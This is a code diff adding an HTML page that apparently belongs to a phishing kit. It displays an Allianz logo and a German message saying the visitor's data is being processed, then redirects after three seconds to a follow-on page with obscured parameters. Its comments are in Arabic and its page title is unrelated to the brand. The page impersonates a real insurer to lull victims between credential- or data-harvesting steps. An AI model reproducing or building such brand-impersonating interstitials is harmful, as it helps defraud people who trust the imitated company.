@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html class="height-full">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1, user-scalable=no"/>
+    <meta name="msapplication-config" content="none"/>
+    <meta name="referrer" content="origin"/>
+    <title>oqqio</title>
+
+		<link rel="icon" type="image/vnd.microsoft.icon" href="./favicon.ico"/>
+		<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="./favicon.ico"/>
+		
+    <link rel="stylesheet" type="text/css" href="./style.css"/>    
+    <style>
+      .loading-wrapper {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 80vh;
+        flex-direction: column;
+        font-family: Arial, sans-serif;
+      }
+
+      .spinner {
+        border: 6px solid #f3f3f3;
+        border-top: 6px solid #0070c9;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      .loading-text {
+        font-size: 18px;
+        color: #333;
+      }
+	  
+    /* ترويسة تحتوي على الشعار */
+    header {
+      padding: 20px 30px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    header img {
+      height: 32px;
+    }
+	  
+    </style>
+</head>
+
+<body>
+  <header style=" max-width: 600px; margin: 40px auto; padding: 0 20px; ">
+    <img src="allo.svg" alt="Allianz Logo">
+  </header>
+  
+    <div class="loading-wrapper">
+        <div class="spinner"></div>
+        <div class="loading-text" style=" text-align: center; ">Bitte warten Sie, Ihre Daten werden verarbeitet...</div>
+    </div>
+</body>
+
+<script>
+  setTimeout(function () {
+    window.location.href = "sm.html?vc?__event=cklls&service_id=top_cddmzd=DE"; // ضع الرابط الذي تريد التوجيه إليه هنا
+  }, 3000); // 3000 ميلي ثانية = 3 ثوانٍ
+</script>
+
+</html>
